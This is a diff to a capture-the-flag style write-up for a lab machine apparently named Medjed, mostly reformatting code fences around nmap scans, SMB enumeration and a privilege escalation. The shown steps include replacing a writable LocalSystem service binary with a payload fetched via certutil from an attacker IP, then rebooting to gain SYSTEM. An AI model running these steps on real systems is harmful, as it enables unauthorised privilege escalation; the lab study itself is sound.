@@ -37,6 +37,9 @@ PORT      STATE SERVICE
 49669/tcp open  unknown
 
 Nmap done: 1 IP address (1 host up) scanned in 17.32 seconds
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ nmap $IP -sC -sV -p 135,139,445,3306,5040,7680,8000,30021,33033,44330,45332,45443,49664-49669
 Starting Nmap 7.95 ( <https://nmap.org> ) at 2026-01-29 02:55 UTC
@@ -262,6 +265,9 @@ Host script results:
 
 Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
 Nmap done: 1 IP address (1 host up) scanned in 189.45 seconds
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ nmap $IP -sU --top-ports 10                                                                  
 Starting Nmap 7.95 ( <https://nmap.org> ) at 2026-01-29 03:06 UTC
@@ -308,10 +314,15 @@ Host script results:
 
 Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
 Nmap done: 1 IP address (1 host up) scanned in 39.62 seconds
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ smbclient -N -L //$IP             
 session setup failed: NT_STATUS_ACCESS_DENIED
-                                                                                                                                          
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ smbmap -H $IP        
 
@@ -457,7 +468,7 @@ medjed\\jerren
 
 Found `local.txt`
 
-```bash
+```cmd
 C:\\Users\\Jerren\\Desktop>dir
  Volume in drive C has no label.
  Volume Serial Number is A41E-B108
@@ -495,7 +506,7 @@ The script identified the password for the user `jerren`
 
 It also identified a high severity “**Image File Permission**” vulnerability. The `C:\\bd\\bd.exe` service executes with `LocalSystem` privileges. However, all `Authenticated Users` possess `WriteData` , `Delete` , and `GenericWrite` permissions, meaning any user can modify, delete, or overwrite the service binary.
 
-```bash
+```cmd
 ????????????????????????????????????????????????????????????????                                                                          
 ? CATEGORY ? TA0004 - Privilege Escalation                     ?                                                                          
 ? NAME     ? Services - Image File Permissions                 ?
@@ -540,9 +551,12 @@ Saved as: bd.exe
 
 Before transferring the payload, I renamed the original service binary to `bd_original.exe` to avoid any file conflicts.
 
-```bash
+```cmd
 C:\\bd>move bd.exe bd_original.exe
         1 file(s) moved.
+```
+
+```cmd
 C:\\bd>certutil -urlcache -split -f <http://192.168.45.236/bd.exe> bd.exe
 ****  Online  ****
   0000  ...
@@ -552,7 +566,7 @@ CertUtil: -URLCache command completed successfully.
 
 To trigger the payload, a service restart was required. Checking `whoami /priv` revealed that the `jerren` account possessed `SeShutdownPrivilege` . I executed a system reboot using the `shutdown /r` command.
 
-```bash
+```cmd
 C:\\bd>whoami /priv
 
 PRIVILEGES INFORMATION
@@ -587,7 +601,7 @@ nt authority\\system
 
 Found `proof.txt`
 
-```bash
+```cmd
 C:\\Users\\Administrator\\Desktop>dir
 dir
  Volume in drive C has no label.
@@ -601,8 +615,11 @@ dir
 01/28/2026  09:52 PM                34 proof.txt
                2 File(s)          2,382 bytes
                2 Dir(s)  16,420,249,600 bytes free
+```
 
+```cmd
 C:\\Users\\Administrator\\Desktop>type proof.txt
 type proof.txt
 ea2a...
 ```
+
